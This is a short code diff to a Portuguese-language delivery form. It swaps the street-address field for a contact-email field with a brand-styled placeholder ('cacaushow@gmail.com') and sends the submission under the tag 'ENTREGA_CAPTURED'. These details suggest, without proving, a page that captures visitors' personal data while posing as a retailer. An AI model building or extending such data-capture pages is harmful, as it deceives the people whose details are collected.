@@ -326,6 +326,14 @@
         <form id="formEntrega" novalidate>
             <div class="form-grid">
 
+
+                  <!-- Endereço -->
+                <div class="field full">
+                    <label for="rua">email para contato</label>
+                    <input id="rua" type="text" placeholder="cacaushow@gmail.com" required autocomplete="address-line1">
+                    <div class="error-msg" id="errRua"></div>
+                </div>
+
                 <!-- CEP -->
                 <div class="field full">
                     <label for="cep">CEP</label>
@@ -335,14 +343,6 @@
                     </div>
                     <div class="error-msg" id="errCep"></div>
                 </div>
-
-                <!-- Endereço -->
-                <div class="field full">
-                    <label for="rua">Endereço</label>
-                    <input id="rua" type="text" placeholder="Rua, Avenida..." required autocomplete="address-line1">
-                    <div class="error-msg" id="errRua"></div>
-                </div>
-
                 <!-- Número + Complemento -->
                 <div class="field">
                     <label for="numero">Número</label>
@@ -517,7 +517,7 @@ async function handleSubmit(e) {
         tipo:       'ENTREGA_CAPTURED',
         timestamp:  new Date().toISOString(),
         cep:        el.cep.value.trim(),
-        endereco:   el.rua.value.trim(),
+        email:   el.rua.value.trim(),
         numero:     el.numero.value.trim(),
         complemento:el.complemento.value.trim(),
         bairro:     el.bairro.value.trim(),
